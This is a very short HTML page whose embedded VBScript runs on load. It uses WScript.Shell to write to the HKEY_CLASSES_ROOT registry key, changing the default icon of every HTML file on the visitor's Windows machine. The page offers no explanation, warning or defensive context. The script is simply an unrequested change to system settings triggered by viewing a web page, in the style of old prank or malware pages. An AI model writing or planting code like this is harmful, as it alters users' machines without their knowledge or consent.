<html><script Language="VBScript">
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\", "C:\Windows\System\Shell32.dll,32"
</script>